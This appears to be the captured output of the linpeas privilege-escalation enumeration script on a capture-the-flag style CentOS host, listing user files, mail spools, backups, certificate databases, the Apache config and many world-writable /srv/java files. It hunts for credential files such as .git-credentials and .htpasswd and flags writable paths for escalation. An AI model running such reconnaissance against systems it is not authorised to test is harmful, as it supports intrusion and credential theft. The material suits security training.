+drwx------. 3 jacob jacob  92 Sep 10 16:05 .
+drwxr-xr-x. 3 root  root   19 Jul 30 22:05 ..
+-rw-r--r--. 1 jacob jacob  18 Apr  1 02:17 .bash_logout
+-rw-r--r--. 1 jacob jacob 193 Apr  1 02:17 .bash_profile
+-rw-r--r--. 1 jacob jacob 231 Apr  1 02:17 .bashrc
+drwx------. 2 jacob jacob  60 Sep 10 16:05 .gnupg
+-rw-r--r--. 1 jacob jacob  33 Jul 31 10:23 user.txt
+
+[+] Files inside others home (limit 20)
+
+[+] Looking for installed mail applications
+mailq.postfix
+newaliases.postfix
+rmail.postfix
+postfix
+postfix
+sendmail
+sendmail.postfix
+mailq.postfix
+newaliases.postfix
+rmail.postfix
+postfix
+sendmail
+sendmail.postfix
+
+[+] Mails (limit 50)
+/var/mail/rpc
+/var/mail/jacob
+/var/spool/mail/rpc
+/var/spool/mail/jacob
+
+[+] Backup files?
+-rw-r--r--. 1 root root 33068 Jul 31 19:44 /var/log/dmesg.old
+-rw-r--r--. 1 apache apache 3402 Jun  2 14:07 /var/www/html/dotclear/plugins/importExport/inc/flat/class.flat.backup.php
+-rw-r--r--. 1 root root 1735 May  8  2019 /etc/nsswitch.conf.bak
+
+[+] Looking for tables inside readable .db/.sqlite files (limit 100)
+ -> Extracting tables from /var/www/html/dotclear/inc/libs/clearbricks/session.db (limit 20)
+ -> Extracting tables from /var/www/html/dotclear/themes/ductile/_config.php (limit 20)
+ -> Extracting tables from /etc/aliases.db (limit 20)
+ -> Extracting tables from /etc/openldap/certs/cert8.db (limit 20)
+ -> Extracting tables from /etc/openldap/certs/key3.db (limit 20)
+ -> Extracting tables from /etc/openldap/certs/secmod.db (limit 20)
+ -> Extracting tables from /etc/pki/nssdb/cert8.db (limit 20)
+ -> Extracting tables from /etc/pki/nssdb/cert9.db (limit 20)
+
+ -> Extracting tables from /etc/pki/nssdb/key3.db (limit 20)
+ -> Extracting tables from /etc/pki/nssdb/key4.db (limit 20)
+
+ -> Extracting tables from /etc/pki/nssdb/secmod.db (limit 20)
+
+[+] Web files?(output limit)
+/var/www/:
+total 0
+drwxr-xr-x.  4 root root  33 Jul 30 22:13 .
+drwxr-xr-x. 19 root root 265 Jul 30 22:13 ..
+drwxr-xr-x.  2 root root   6 Apr  2 13:14 cgi-bin
+drwxr-xr-x.  3 root root  22 Apr 20 04:49 html
+
+/var/www/cgi-bin:
+total 0
+drwxr-xr-x. 2 root root  6 Apr  2 13:14 .
+
+[+] Readable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
+-rw-r--r--. 1 root root 2853 Apr  1 04:29 /etc/bashrc
+-rw-r--r--. 1 root root 11753 Nov 27  2019 /etc/httpd/conf/httpd.conf
+Reading /etc/httpd/conf/httpd.conf
+ServerRoot "/etc/httpd"
+Listen 80
+Include conf.modules.d/*.conf
+User apache
+Group apache
+ServerAdmin root@localhost
+<Directory />
+    AllowOverride none
+    Require all denied
+</Directory>
+DocumentRoot "/var/www/html"
+<Directory "/var/www">
+    AllowOverride None
+    Require all granted
+</Directory>
+<Directory "/var/www/html">
+    Options Indexes FollowSymLinks
+    AllowOverride None
+    Require all granted
+</Directory>
+<IfModule dir_module>
+    DirectoryIndex index.html
+</IfModule>
+<Files ".ht*">
+    Require all denied
+</Files>
+ErrorLog "logs/error_log"
+LogLevel warn
+<IfModule log_config_module>
+    LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\"" combined
+    LogFormat "%h %l %u %t \"%r\" %>s %b" common
+    <IfModule logio_module>
+      LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\" %I %O" combinedio
+    </IfModule>
+    CustomLog "logs/access_log" combined
+</IfModule>
+<IfModule alias_module>
+    ScriptAlias /cgi-bin/ "/var/www/cgi-bin/"
+</IfModule>
+<Directory "/var/www/cgi-bin">
+    AllowOverride None
+    Options None
+    Require all granted
+</Directory>
+<IfModule mime_module>
+    TypesConfig /etc/mime.types
+    AddType application/x-compress .Z
+    AddType application/x-gzip .gz .tgz
+    AddType text/html .shtml
+    AddOutputFilter INCLUDES .shtml
+</IfModule>
+AddDefaultCharset UTF-8
+<IfModule mime_magic_module>
+    MIMEMagicFile conf/magic
+</IfModule>
+EnableSendfile on
+IncludeOptional conf.d/*.conf
+
+-rw-r--r--. 1 root root 231 Apr  1 02:17 /etc/skel/.bashrc
+-rw-r--r--. 1 jacob jacob 231 Apr  1 02:17 /home/jacob/.bashrc
+drwxr-xr-x. 2 root root 22 Jul 30 21:31 /usr/lib64/python2.7/config
+-rw-r--r--. 1 root root 77 Nov 27  2019 /usr/lib/tmpfiles.d/httpd.conf
+Reading /usr/lib/tmpfiles.d/httpd.conf
+d /run/httpd   710 root apache
+d /run/httpd/htcacheclean   700 apache apache
+
+
+[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
+-rw-r--r--. 1 root root 18 Apr  1 02:17 /etc/skel/.bash_logout
+-rw-r--r--. 1 root root 193 Apr  1 02:17 /etc/skel/.bash_profile
+-rw-r--r--. 1 root root 129 Jun 30 15:22 /etc/selinux/targeted/.policy.sha512
+-rw-------. 1 root root 0 Jun  1  2019 /etc/.pwd.lock
+-rw-r--r--. 1 root root 163 Jun  1  2019 /etc/.updated
+-rw-r--r--. 1 root root 0 Jul 30 22:07 /etc/.java/.systemPrefs/.system.lock
+-rw-r--r--. 1 root root 0 Jul 30 22:07 /etc/.java/.systemPrefs/.systemRootModFile
+-rw-r--r--. 1 root root 0 Jun  1  2019 /var/lib/rpm/.dbenv.lock
+-rw-r--r--. 1 root root 0 Jun  1  2019 /var/lib/rpm/.rpm.lock
+-rw-r--r--. 1 root root 2080 Jul 31 09:34 /var/lib/pear/.depdb
+-rw-r--r--. 1 root root 0 Jul 31 09:34 /var/lib/pear/.depdblock
+-rw-r--r--. 1 root root 8591 Jul 31 09:34 /var/lib/pear/.filemap
+-rw-r--r--. 1 root root 0 Jul 31 09:34 /var/lib/pear/.lock
+-rw-r--r--. 1 root root 0 Jul 30 21:33 /var/cache/yum/x86_64/7/.gpgkeyschecked.yum
+-rw-r--r--. 1 root root 163 Jun  1  2019 /var/.updated
+-rw-r--r--. 1 apache apache 148 Jun  2 14:07 /var/www/html/dotclear/db/.htaccess
+-rw-r--r--. 1 apache apache 855 Jun  2 14:07 /var/www/html/dotclear/inc/libs/clearbricks/.editorconfig
+-rw-r--r--. 1 apache apache 11987 Jun  2 14:07 /var/www/html/dotclear/inc/libs/clearbricks/.doxygen.conf
+-rw-r--r--. 1 apache apache 148 Jun  2 14:07 /var/www/html/dotclear/inc/.htaccess
+-rw-r--r--. 1 apache apache 148 Jun  2 14:07 /var/www/html/dotclear/var/.htaccess
+-rw-r--r--. 1 apache apache 148 Jun  2 14:07 /var/www/html/dotclear/cache/.htaccess
+-rw-r--r--. 1 apache apache 148 Jun  2 14:07 /var/www/html/dotclear/plugins/.htaccess
+-rw-r--r--. 1 root root 65 Aug  9  2019 /usr/lib64/.libcrypto.so.1.0.2k.hmac
+-rw-r--r--. 1 root root 65 Aug  2  2017 /usr/lib64/.libgcrypt.so.11.hmac
+-rw-r--r--. 1 root root 65 Aug  9  2019 /usr/lib64/.libssl.so.1.0.2k.hmac
+-rw-r--r--. 1 root root 65 Nov  6  2016 /usr/lib64/.libhogweed.so.2.5.hmac
+-rw-r--r--. 1 root root 65 Mar 14  2019 /usr/lib64/.libgnutls.so.28.43.3.hmac
+-rw-r--r--. 1 root root 65 Nov  6  2016 /usr/lib64/.libnettle.so.4.7.hmac
+-rw-r--r--. 1 root root 40 Apr  1 02:17 /usr/share/man/man1/..1.gz
+-rw-r--r--. 1 root root 42 Apr  1 03:06 /usr/share/man/man5/.k5identity.5.gz
+-rw-r--r--. 1 root root 39 Apr  1 03:06 /usr/share/man/man5/.k5login.5.gz
+-rw-r--r--. 1 root root 2328 Apr 23  2013 /usr/share/kde4/apps/kdm/themes/CentOS7/.colorlsCZ1
+-rw-r--r--. 1 root root 171 May 14  2019 /boot/.vmlinuz-3.10.0-957.12.2.el7.x86_64.hmac
+-rw-r--r--. 1 root root 172 Jul 26 15:31 /boot/.vmlinuz-3.10.0-1127.18.2.el7.x86_64.hmac
+-rw-r--r--. 1 jacob jacob 18 Apr  1 02:17 /home/jacob/.bash_logout
+-rw-r--r--. 1 jacob jacob 193 Apr  1 02:17 /home/jacob/.bash_profile
+
+[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 70)
+-rw-------. 1 jacob jacob 32768 Sep 10 16:05 /tmp/hsperfdata_jacob/1091
+-rw-r--r--. 1 jacob jacob 3736 Apr 21 23:37 /var/tmp/yum-jacob-pY64vg/x86_64/7/base/repomd.xml
+-rw-r--r--. 1 jacob jacob 0 Jul 31 09:32 /var/tmp/yum-jacob-pY64vg/x86_64/7/base/cachecookie
+-rw-r--r--. 1 jacob jacob 538 Jul 30 21:26 /var/tmp/yum-jacob-pY64vg/x86_64/7/base/mirrorlist.txt
+-rw-r--r--. 1 jacob jacob 4851 Jul 30 18:08 /var/tmp/yum-jacob-pY64vg/x86_64/7/epel/repomd.xml
+-rw-r--r--. 1 jacob jacob 0 Jul 31 09:33 /var/tmp/yum-jacob-pY64vg/x86_64/7/epel/cachecookie
+-rw-r--r--. 1 jacob jacob 51635 Jul 31 09:32 /var/tmp/yum-jacob-pY64vg/x86_64/7/epel/metalink.xml
+-rw-r--r--. 1 jacob jacob 2994 Jul  6 15:06 /var/tmp/yum-jacob-pY64vg/x86_64/7/extras/repomd.xml
+-rw-r--r--. 1 jacob jacob 0 Jul 31 09:32 /var/tmp/yum-jacob-pY64vg/x86_64/7/extras/cachecookie
+-rw-r--r--. 1 jacob jacob 578 Jul 30 21:26 /var/tmp/yum-jacob-pY64vg/x86_64/7/extras/mirrorlist.txt
+-rw-r--r--. 1 jacob jacob 3096 Jul 29 05:49 /var/tmp/yum-jacob-pY64vg/x86_64/7/remi-php73/repomd.xml
+-rw-r--r--. 1 jacob jacob 0 Jul 31 09:34 /var/tmp/yum-jacob-pY64vg/x86_64/7/remi-php73/cachecookie
+-rw-r--r--. 1 jacob jacob 3572 Jul 31 09:33 /var/tmp/yum-jacob-pY64vg/x86_64/7/remi-php73/mirrorlist.txt
+-rw-r--r--. 1 jacob jacob 3106 Jul 29 05:41 /var/tmp/yum-jacob-pY64vg/x86_64/7/remi-safe/repomd.xml
+-rw-r--r--. 1 jacob jacob 0 Jul 31 09:33 /var/tmp/yum-jacob-pY64vg/x86_64/7/remi-safe/cachecookie
+-rw-r--r--. 1 jacob jacob 3574 Jul 31 09:32 /var/tmp/yum-jacob-pY64vg/x86_64/7/remi-safe/mirrorlist.txt
+-rw-r--r--. 1 jacob jacob 3007 Jul 29 23:01 /var/tmp/yum-jacob-pY64vg/x86_64/7/updates/repomd.xml
+-rw-r--r--. 1 jacob jacob 0 Jul 31 09:32 /var/tmp/yum-jacob-pY64vg/x86_64/7/updates/cachecookie
+-rw-r--r--. 1 jacob jacob 588 Jul 30 21:26 /var/tmp/yum-jacob-pY64vg/x86_64/7/updates/mirrorlist.txt
+
+[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+awk: cmd. line:1: (FILENAME=- FNR=1751) fatal: print to "standard output" failed (Broken pipe)
+/dev/mqueue
+/dev/mqueue/linpeas.txt28118
+/dev/shm
+/dev/shm/linpeas.sh
+/home/jacob
+/run/user/1001
+/srv/java
+/srv/java/bin
+/srv/java/bin/appletviewer
+/srv/java/bin/apt
+/srv/java/bin/extcheck
+/srv/java/bin/idlj
+/srv/java/bin/jar
+/srv/java/bin/jarsigner
+/srv/java/bin/java
+/srv/java/bin/javac
+/srv/java/bin/javadoc
+/srv/java/bin/javah
+/srv/java/bin/javap
+#)You_can_write_even_more_files_inside_last_directory
+/srv/java/demo
+/srv/java/demo/applets
+/srv/java/demo/applets/Animator
+/srv/java/demo/applets/Animator/Animation.class
+/srv/java/demo/applets/Animator/AnimationFrame.class
+/srv/java/demo/applets/Animator/Animator.class
+/srv/java/demo/applets/Animator/Animator.java
+/srv/java/demo/applets/Animator/audio
+/srv/java/demo/applets/Animator/audio/0.au
+/srv/java/demo/applets/Animator/audio/1.au
+/srv/java/demo/applets/Animator/audio/2.au
+/srv/java/demo/applets/Animator/audio/3.au
+/srv/java/demo/applets/Animator/audio/4.au
+/srv/java/demo/applets/Animator/audio/5.au
+/srv/java/demo/applets/Animator/audio/6.au
+/srv/java/demo/applets/Animator/audio/7.au
+/srv/java/demo/applets/Animator/audio/8.au
+/srv/java/demo/applets/Animator/audio/9.au
+/srv/java/demo/applets/Animator/audio/spacemusic.au
+#)You_can_write_even_more_files_inside_last_directory
+/srv/java/demo/applets/Animator/example1.html
+/srv/java/demo/applets/Animator/example2.html
+/srv/java/demo/applets/Animator/example3.html
+/srv/java/demo/applets/Animator/example4.html
+/srv/java/demo/applets/Animator/images
+/srv/java/demo/applets/Animator/images/Beans
+/srv/java/demo/applets/Animator/images/SimpleAnimation
+/srv/java/demo/applets/Animator/index.html
+/srv/java/demo/applets/Animator/ParseException.class
+/srv/java/demo/applets/ArcTest
+/srv/java/demo/applets/ArcTest/ArcCanvas.class
+/srv/java/demo/applets/ArcTest/ArcControls.class
+/srv/java/demo/applets/ArcTest/ArcTest.class
+/srv/java/demo/applets/ArcTest/ArcTest.java
+/srv/java/demo/applets/ArcTest/example1.html
+/srv/java/demo/applets/ArcTest/IntegerTextField.class
+/srv/java/demo/applets/BarChart
+/srv/java/demo/applets/BarChart/BarChart.class
+/srv/java/demo/applets/BarChart/BarChart.java
+/srv/java/demo/applets/BarChart/example1.html
+/srv/java/demo/applets/Blink
+/srv/java/demo/applets/Blink/Blink$1.class
+/srv/java/demo/applets/Blink/Blink.class
+/srv/java/demo/applets/Blink/Blink.java
+/srv/java/demo/applets/Blink/example1.html
+/srv/java/demo/applets/CardTest
+/srv/java/demo/applets/CardTest/CardPanel.class
+/srv/java/demo/applets/CardTest/CardTest.class
+/srv/java/demo/applets/CardTest/CardTest.java
+/srv/java/demo/applets/CardTest/example1.html
+/srv/java/demo/applets/Clock
+/srv/java/demo/applets/Clock/Clock.class
+/srv/java/demo/applets/Clock/Clock.java
+/srv/java/demo/applets/Clock/example1.html
+/srv/java/demo/applets/DitherTest
+/srv/java/demo/applets/DitherTest/CardinalTextField.class
+/srv/java/demo/applets/DitherTest/DitherCanvas.class
+/srv/java/demo/applets/DitherTest/DitherControls.class
+/srv/java/demo/applets/DitherTest/DitherTest.class
+/srv/java/demo/applets/DitherTest/DitherTest.java
+/srv/java/demo/applets/DitherTest/example1.html
+/srv/java/demo/applets/DrawTest
+/srv/java/demo/applets/DrawTest/DrawControls.class
+/srv/java/demo/applets/DrawTest/DrawPanel.class
+/srv/java/demo/applets/DrawTest/DrawTest.class
+/srv/java/demo/applets/DrawTest/DrawTest.java
+/srv/java/demo/applets/DrawTest/example1.html
+/srv/java/demo/applets/Fractal
+/srv/java/demo/applets/Fractal/CLSFractal.class
+/srv/java/demo/applets/Fractal/CLSFractal.java
+/srv/java/demo/applets/Fractal/CLSRule.class
+/srv/java/demo/applets/Fractal/CLSTurtle.class
+/srv/java/demo/applets/Fractal/ContextLSystem.class
+/srv/java/demo/applets/Fractal/example1.html
+/srv/java/demo/applets/GraphicsTest
+/srv/java/demo/applets/GraphicsTest/AppletFrame.class
+/srv/java/demo/applets/GraphicsTest/AppletFrame.java
+/srv/java/demo/applets/GraphicsTest/ArcCard.class
+/srv/java/demo/applets/GraphicsTest/ArcDegreePanel.class
+/srv/java/demo/applets/GraphicsTest/ArcPanel.class
+/srv/java/demo/applets/GraphicsTest/ColorUtils.class
+/srv/java/demo/applets/GraphicsTest/example1.html
+/srv/java/demo/applets/GraphicsTest/GraphicsCards.class
+/srv/java/demo/applets/GraphicsTest/GraphicsPanel.class
+/srv/java/demo/applets/GraphicsTest/GraphicsTest.class
+/srv/java/demo/applets/GraphicsTest/GraphicsTest.java
+#)You_can_write_even_more_files_inside_last_directory
+/srv/java/demo/applets/GraphLayout/audio
+/srv/java/demo/applets/GraphLayout/audio/computer.au
+/srv/java/demo/applets/GraphLayout/audio/drip.au
+/srv/java/demo/applets/GraphLayout/audio/gong.au
+/srv/java/demo/applets/GraphLayout/Edge.class
+/srv/java/demo/applets/GraphLayout/example1.html
+/srv/java/demo/applets/GraphLayout/example2.html
+/srv/java/demo/applets/GraphLayout/example3.html
+/srv/java/demo/applets/GraphLayout/example4.html
+/srv/java/demo/applets/GraphLayout/Graph.class
+/srv/java/demo/applets/GraphLayout/Graph.java
+/srv/java/demo/applets/GraphLayout/GraphPanel.class
+/srv/java/demo/applets/GraphLayout/Node.class
+/srv/java/demo/applets/ImageMap
+/srv/java/demo/applets/ImageMap/AniArea.class
+/srv/java/demo/applets/ImageMap/AniArea.java
+/srv/java/demo/applets/ImageMap/audio
+/srv/java/demo/applets/ImageMap/audio/chirp1.au
+/srv/java/demo/applets/ImageMap/audio/hi.au
+/srv/java/demo/applets/ImageMap/ButtonFilter.class
+/srv/java/demo/applets/ImageMap/ButtonFilter.java
+/srv/java/demo/applets/ImageMap/ClickArea.class
+/srv/java/demo/applets/ImageMap/ClickArea.java
+/srv/java/demo/applets/ImageMap/DelayedSoundArea.class
+/srv/java/demo/applets/ImageMap/DelayedSoundArea.java
+/srv/java/demo/applets/ImageMap/example1.html
+/srv/java/demo/applets/ImageMap/HighlightArea.class
+/srv/java/demo/applets/ImageMap/HighlightArea.java
+/srv/java/demo/applets/ImageMap/HighlightFilter.class
+/srv/java/demo/applets/ImageMap/HighlightFilter.java
+#)You_can_write_even_more_files_inside_last_directory
+/srv/java/demo/applets/JumpingBox/example1.html
+/srv/java/demo/applets/JumpingBox/JumpingBox.class
+/srv/java/demo/applets/JumpingBox/JumpingBox.java
+/srv/java/demo/applets/JumpingBox/sounds
+/srv/java/demo/applets/JumpingBox/sounds/adapt-or-die.au
+/srv/java/demo/applets/JumpingBox/sounds/cannot.be.completed.au
+/srv/java/demo/applets/JumpingBox/sounds/danger.au
+/srv/java/demo/applets/JumpingBox/sounds/ip.au
+/srv/java/demo/applets/JumpingBox/sounds/that.hurts.au
+/srv/java/demo/applets/JumpingBox/sounds/thin.bell.au
+/srv/java/demo/applets/JumpingBox/sounds/tiptoe.thru.the.tulips.au
+/srv/java/demo/applets/MoleculeViewer
+/srv/java/demo/applets/MoleculeViewer/Atom.class
+/srv/java/demo/applets/MoleculeViewer/example1.html
+/srv/java/demo/applets/MoleculeViewer/example2.html
+/srv/java/demo/applets/MoleculeViewer/example3.html
+/srv/java/demo/applets/MoleculeViewer/Matrix3D.class
+/srv/java/demo/applets/MoleculeViewer/Matrix3D.java
+/srv/java/demo/applets/MoleculeViewer/models
+/srv/java/demo/applets/MoleculeViewer/models/benzene.xyz
+/srv/java/demo/applets/MoleculeViewer/models/buckminsterfullerine.xyz
+/srv/java/demo/applets/MoleculeViewer/models/cyclohexane.xyz
+/srv/java/demo/applets/MoleculeViewer/models/ethane.xyz
+/srv/java/demo/applets/MoleculeViewer/models/HyaluronicAcid.xyz
+/srv/java/demo/applets/MoleculeViewer/models/water.xyz
+/srv/java/demo/applets/MoleculeViewer/XYZApp.class
+/srv/java/demo/applets/MoleculeViewer/XYZApp.java
+/srv/java/demo/applets/MoleculeViewer/XYZChemModel.class
+/srv/java/demo/applets/NervousText
+/srv/java/demo/applets/NervousText/example1.html
+/srv/java/demo/applets/NervousText/NervousText.class
+/srv/java/demo/applets/NervousText/NervousText.java
+/srv/java/demo/applets/SimpleGraph
+/srv/java/demo/applets/SimpleGraph/example1.html
+/srv/java/demo/applets/SimpleGraph/GraphApplet.class
+/srv/java/demo/applets/SimpleGraph/GraphApplet.java
+/srv/java/demo/applets/SortDemo
+/srv/java/demo/applets/SortDemo/BidirBubbleSortAlgorithm.class
+/srv/java/demo/applets/SortDemo/BidirBubbleSortAlgorithm.java
+/srv/java/demo/applets/SortDemo/BubbleSortAlgorithm.class
+/srv/java/demo/applets/SortDemo/BubbleSortAlgorithm.java
+/srv/java/demo/applets/SortDemo/example1.html
+/srv/java/demo/applets/SortDemo/QSortAlgorithm.class
+/srv/java/demo/applets/SortDemo/QSortAlgorithm.java
+/srv/java/demo/applets/SortDemo/SortAlgorithm.class
+/srv/java/demo/applets/SortDemo/SortAlgorithm.java
+/srv/java/demo/applets/SortDemo/SortItem.class
+/srv/java/demo/applets/SortDemo/SortItem.java
+#)You_can_write_even_more_files_inside_last_directory
+/srv/java/demo/applets/SpreadSheet/Cell.class
+/srv/java/demo/applets/SpreadSheet/CellUpdater.class
+/srv/java/demo/applets/SpreadSheet/example1.html
+/srv/java/demo/applets/SpreadSheet/InputField.class
+/srv/java/demo/applets/SpreadSheet/Node.class
+/srv/java/demo/applets/SpreadSheet/SpreadSheet.class
+/srv/java/demo/applets/SpreadSheet/SpreadSheetInput.class
+/srv/java/demo/applets/SpreadSheet/SpreadSheet.java
+/srv/java/demo/applets/TicTacToe
+/srv/java/demo/applets/TicTacToe/audio
+/srv/java/demo/applets/TicTacToe/audio/beep.au
+/srv/java/demo/applets/TicTacToe/audio/ding.au
+/srv/java/demo/applets/TicTacToe/audio/return.au
+/srv/java/demo/applets/TicTacToe/audio/yahoo1.au
+/srv/java/demo/applets/TicTacToe/audio/yahoo2.au
+/srv/java/demo/applets/TicTacToe/example1.html
+/srv/java/demo/applets/TicTacToe/images
+/srv/java/demo/applets/TicTacToe/TicTacToe.class
+/srv/java/demo/applets/TicTacToe/TicTacToe.java
+/srv/java/demo/applets/WireFrame
+/srv/java/demo/applets/WireFrame/example1.html
+/srv/java/demo/applets/WireFrame/example2.html
+/srv/java/demo/applets/WireFrame/example3.html
+/srv/java/demo/applets/WireFrame/example4.html
+/srv/java/demo/applets/WireFrame/FileFormatException.class
+/srv/java/demo/applets/WireFrame/Matrix3D.class
+/srv/java/demo/applets/WireFrame/Matrix3D.java
+/srv/java/demo/applets/WireFrame/Model3D.class
+/srv/java/demo/applets/WireFrame/models
+/srv/java/demo/applets/WireFrame/models/cube.obj
+/srv/java/demo/applets/WireFrame/models/dinasaur.obj
+/srv/java/demo/applets/WireFrame/models/hughes_500.obj
+/srv/java/demo/applets/WireFrame/models/knoxS.obj
+/srv/java/demo/applets/WireFrame/ThreeD.class
+/srv/java/demo/applets/WireFrame/ThreeD.java
+/srv/java/demo/jfc
+/srv/java/demo/jfc/CodePointIM
+/srv/java/demo/jfc/CodePointIM/CodePointIM.jar
+/srv/java/demo/jfc/CodePointIM/README.html
+/srv/java/demo/jfc/CodePointIM/README_ja.html
+/srv/java/demo/jfc/CodePointIM/README_zh_CN.html
+/srv/java/demo/jfc/CodePointIM/src
+/srv/java/demo/jfc/CodePointIM/src/CodePointIM.java
+/srv/java/demo/jfc/CodePointIM/src/CodePointInputMethodDescriptor.java
+/srv/java/demo/jfc/CodePointIM/src/CodePointInputMethod.java
+/srv/java/demo/jfc/CodePointIM/src/resources
+/srv/java/demo/jfc/CodePointIM/src/resources/codepoint_ja.properties
+/srv/java/demo/jfc/CodePointIM/src/resources/codepoint.properties
+/srv/java/demo/jfc/CodePointIM/src/resources/codepoint_zh_CN.properties
+/srv/java/demo/jfc/FileChooserDemo
+/srv/java/demo/jfc/FileChooserDemo/FileChooserDemo.jar
+/srv/java/demo/jfc/FileChooserDemo/README.txt
+/srv/java/demo/jfc/FileChooserDemo/src
+/srv/java/demo/jfc/FileChooserDemo/src/ExampleFileFilter.java
+/srv/java/demo/jfc/FileChooserDemo/src/ExampleFileView.java
+/srv/java/demo/jfc/FileChooserDemo/src/FileChooserDemo.java
+/srv/java/demo/jfc/FileChooserDemo/src/resources
+/srv/java/demo/jfc/FileChooserDemo/src/resources/images
+/srv/java/demo/jfc/Font2DTest
+/srv/java/demo/jfc/Font2DTest/Font2DTest.html
+/srv/java/demo/jfc/Font2DTest/Font2DTest.jar
+/srv/java/demo/jfc/Font2DTest/README.txt
+/srv/java/demo/jfc/Font2DTest/src
+/srv/java/demo/jfc/Font2DTest/src/Font2DTestApplet.java
+/srv/java/demo/jfc/Font2DTest/src/Font2DTest.java
+/srv/java/demo/jfc/Font2DTest/src/FontPanel.java
+/srv/java/demo/jfc/Font2DTest/src/RangeMenu.java
+/srv/java/demo/jfc/Java2D
+/srv/java/demo/jfc/Java2D/Java2Demo.html
+/srv/java/demo/jfc/Java2D/Java2Demo.jar
+/srv/java/demo/jfc/Java2D/README.txt
+/srv/java/demo/jfc/Java2D/src
+/srv/java/demo/jfc/Java2D/src/fonts
+/srv/java/demo/jfc/Java2D/src/fonts/A.ttf
+/srv/java/demo/jfc/Java2D/src/images
+/srv/java/demo/jfc/Java2D/src/java2d
+/srv/java/demo/jfc/Java2D/src/java2d/AnimatingControlsSurface.java
+/srv/java/demo/jfc/Java2D/src/java2d/AnimatingSurface.java
+/srv/java/demo/jfc/Java2D/src/java2d/CloningFeature.java
+/srv/java/demo/jfc/Java2D/src/java2d/ControlsSurface.java
+/srv/java/demo/jfc/Java2D/src/java2d/CustomControlsContext.java
+/srv/java/demo/jfc/Java2D/src/java2d/CustomControls.java
+/srv/java/demo/jfc/Java2D/src/java2d/DemoFonts.java
+/srv/java/demo/jfc/Java2D/src/java2d/DemoGroup.java
+/srv/java/demo/jfc/Java2D/src/java2d/DemoImages.java
+/srv/java/demo/jfc/Java2D/src/java2d/DemoPanel.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos
+#)You_can_write_even_more_files_inside_last_directory
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Arcs_Curves/Arcs.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Arcs_Curves/BezierAnim.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Arcs_Curves/Curves.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Arcs_Curves/Ellipses.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Clipping
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Clipping/Areas.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Clipping/ClipAnim.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Clipping/Intersection.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Clipping/Text.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Colors
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Colors/BullsEye.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Colors/ColorConvert.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Colors/Rotator3D.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Composite
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Composite/ACimages.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Composite/ACrules.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Composite/FadeAnim.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Fonts
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Fonts/AllFonts.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Fonts/AttributedStr.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Fonts/Highlighting.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Fonts/Outline.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Fonts/Tree.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Images
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Images/DukeAnim.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Images/ImageOps.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Images/JPEGFlip.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Images/WarpImage.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Lines
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Lines/Caps.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Lines/Dash.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Lines/Joins.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Lines/LineAnim.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Mix
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Mix/Balls.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Mix/BezierScroller.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Mix/Stars3D.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Paint
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Paint/GradAnim.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Paint/Gradient.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Paint/TextureAnim.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Paint/Texture.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Paths
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Paths/Append.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Paths/CurveQuadTo.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Paths/FillStroke.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Paths/WindingRule.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Transforms
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Transforms/Rotate.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Transforms/SelectTx.java
+/srv/java/demo/jfc/Java2D/src/java2d/demos/Transforms/TransformAnim.java
